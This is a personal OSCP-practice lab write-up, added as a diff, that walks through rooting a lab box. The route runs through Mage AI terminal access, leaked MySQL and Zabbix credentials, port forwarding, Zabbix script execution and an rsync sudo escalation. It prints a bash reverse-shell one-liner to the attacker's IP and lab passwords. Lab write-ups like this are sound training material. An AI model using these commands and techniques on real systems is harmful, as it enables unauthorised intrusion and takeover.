@@ -1,0 +1,241 @@
+**Start 10:48 20-05-2025**
+
+---
+```
+Scope:
+192.168.129.210
+```
+
+# Objectives
+
+>[!summary]
+>This lab challenges you to exploit misconfigurations in Mage AI and Zabbix to escalate privileges to root. Gaining initial access through Mage AI, you'll extract database credentials and leverage port forwarding to access the restricted Zabbix UI. By abusing Zabbix’s script execution feature, you'll execute arbitrary commands, elevate privileges to zabbix, and ultimately escalate to root using rsync misconfigurations.
+
+This lab simulates an attack scenario where you exploit misconfigurations in Mage AI and Zabbix to escalate privileges to root. After gaining initial access through Mage AI, you'll extract database credentials and use port forwarding to bypass access restrictions to the Zabbix UI. By abusing Zabbix’s script execution feature, you'll execute arbitrary commands, gain a shell as zabbix, and escalate to root using a sudo misconfiguration with rsync.
+
+## Attack Zab
+
+- Gain access to Mage AI terminal as www-data.
+- Extract MySQL database credentials and retrieve the Zabbix admin password.
+- Use chisel to forward ports and access the Zabbix UI.
+- Exploit Zabbix script execution to gain a shell as zabbix.
+- Escalate to root by abusing sudo rsync.
+
+# Recon
+
+## Nmap
+
+```bash
+sudo nmap -sC -sV zab -sT -vvvv -p- -Pn -T5 --min-rate=5000
+
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+6789/tcp open  http    syn-ack Tornado httpd 6.3.3
+| http-methods: 
+|_  Supported Methods: GET
+|_http-server-header: TornadoServer/6.3.3
+|_http-title: Mage
+|_http-favicon: Unknown favicon MD5: 14B7DB3EB16DEF7F593F14D8621E9BBB
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+## 6789/TCP - HTTP
+
+I went to this webpage and found the following:
+
+![](../../../assets/fb5ae45c9cafff6eb8c1f8d2f77c3279.png)
+
+>[!note]
+>Funnily enough I was able to find `local.txt` in here lol:
+>![](../../../assets/57fe1f93c15f1f5ecb1025c80b421c98.png)
+
+This is because there's already a terminal running here:
+
+![](../../../assets/c07963f9f16942452ae0799f356e95bc.png)
+
+### local.txt
+
+![](../../../assets/31abe4eb93b09247f273e426312d66f0.png)
+
+# Foothold
+## Shell as www-data
+
+I was able to ping myself so I figured I could get easy RCE:
+
+![](../../../assets/cec1f2b7327f1047addf6867cc4d6593.png)
+
+![](../../../assets/0722b6d721fffe1803dc413194f9fcb8.png)
+
+![](../../../assets/6d634ab0ca432c2245a8d2f06e935bbd.png)
+
+Once I get my reverse shell I can now start looking for ways to move laterally.
+
+![](../../../assets/852070c19b70cec6de1bc200ad3cfc29.png)
+
+Inside the `/etc/passwd` file was the service user `zabbix` mentioned.
+
+After doing some more digging I found something interesting:
+
+![](../../../assets/ad8de705c622cbf1ea829ed51db06dc0.png)
+
+![](../../../assets/ab1a6d0321af58d26feac1a7ac8710fd.png)
+
+Inside this file was the following:
+
+![](../../../assets/98207fa3ee08a73eae0b9ef58b1f60f1.png)
+
+Hell yeah!
+
+```
+zabbix
+breadandbuttereater121
+```
+
+## MySQL
+
+We access it using the found creds:
+
+![](../../../assets/c333d012e79dfd92e4dfecff80a84b72.png)
+
+![](../../../assets/6dc93138b7fc61ecb06deab429482896.png)
+
+We go ahead and try to crack the password using `hashcat`
+
+## Hashcat
+
+![](../../../assets/16521cf44725d42cf0cb634ac3ece49c.png)
+
+![](../../../assets/a38c611d8c1ac6fdea353d7d9fd4a8a8.png)
+
+```
+Zabbix
+dinosaur
+```
+
+However we cannot access the *zabbix* user via `ssh`:
+
+![](../../../assets/261adbb1ec48e9bfbc968c4867865fe3.png)
+
+I check what ports **zabbix** usually runs under:
+
+![](../../../assets/19a3d855f1edede6748529c0a96fa620.png)
+
+I yet again check using `ss`:
+
+![](../../../assets/fec1f3bab66e29dd7622224e272ac586.png)
+
+Seems like the ports are only open internally, meaning we'll have to *Port Forward*.
+
+## Port Forwarding
+
+![](../../../assets/d095bf5909332f769432707f5a61dc4f.png)
+
+![](../../../assets/d73e43cdca729255c4038286ee36d93a.png)
+
+Now we need to set up a new route to `240.0.0.1` on our `kali`:
+
+![](../../../assets/e7094985a0dd014e744c602e794c6f93.png)
+
+Now that it is set up we can access it:
+
+![](../../../assets/9dd2394412069f51061ff692331bc7db.png)
+
+![](../../../assets/c40e970fdd5d06f092bfa77ed7244395.png)
+
+Using the found `Admin - dinosaur` creds we get easy access:
+
+![](../../../assets/975cfe2fc51daea9bc298ce1eec438c8.png)
+
+I started enumerating the website and how to access any spot to get RCE from:
+
+![](../../../assets/d1102cbd24050f95c835e2a5fad69250.png)
+
+>[!note]
+>I found the above on a forum post
+
+![](../../../assets/da576b730ebbc76ad9d8ea6f4d94dab6.png)
+
+![](../../../assets/1dfdc1a225c6ab7fa11df1ecb782d400.png)
+
+We head over to the top right **Create script**:
+
+![](../../../assets/32482ade98406814f594902b5008ad62.png)
+
+We click save and then head on over to **Monitoring -> Hosts**:
+
+![](../../../assets/b7dbb67143652f329c4e0898eefbe294.png)
+
+Here we hover over the **Zabbix server** and find our script:
+
+![](../../../assets/63f3130c60a2ff20d0de91c5b5b0f53d.png)
+
+Click on it and it should execute:
+
+![](../../../assets/bac696e621855bdc050869916085217c.png)
+
+>[!fail]
+>It kept hanging instead so I `base64` encoded it:
+
+![](../../../assets/929bbf537244235457702226c50d563a.png)
+
+![](../../../assets/5b545ab34b959be6377067c977a16d35.png)
+
+![](../../../assets/6cfb700ed8d42a5838c04e52f27b78a8.png)
+
+Nothing?
+
+Let's try a different payload.
+
+```bash
+echo ‘bash -i >& /dev/tcp/192.168.45.179/443 0>&1’ | base64
+```
+
+![](../../../assets/5ddb72edb91cb6719f745cfbfdb62eeb.png)
+
+![](../../../assets/dbc85eb6332a5f53a1596edf4ad395ce.png)
+
+>[!bug]
+>I had to restart the fucking box and it worked from the get go:
+
+![](../../../assets/b49704c12c60fb5f08d2fa296f34d0d5.png)
+
+![](../../../assets/0ee5a9824d4aac7e0fd3dda4b1c9c739.png)
+
+![](../../../assets/a41592e501aeacd8f08b1c0e3063ab44.png)
+
+# Privilege Escalation
+## Enumeration
+
+Once we gain access we go right back to enum:
+
+![](../../../assets/009397a9242d407154e42535ef6cc5f9.png)
+
+Well I guess that's our PE vector.
+
+### Rsync GTFObins
+
+![](../../../assets/9e17e65bbe318c427a1e22769dbea6ab.png)
+
+![](../../../assets/bdc32d13295de983eff3fead4494e8b1.png)
+
+And we're *root* just like that.
+
+### proof.txt
+
+![](../../../assets/d3590383047714420a1a983f3c5b3d0e.png)
+
+>[!summary]
+>Very easy box, could've saved a lot of time if the connection didn't fuck me up as ALWAYS!!!
+
+---
+
+**Finished 13:03 20-05-2025**
+
+[^Links]: [[OSCP Prep]]
+
+#Ligolo 
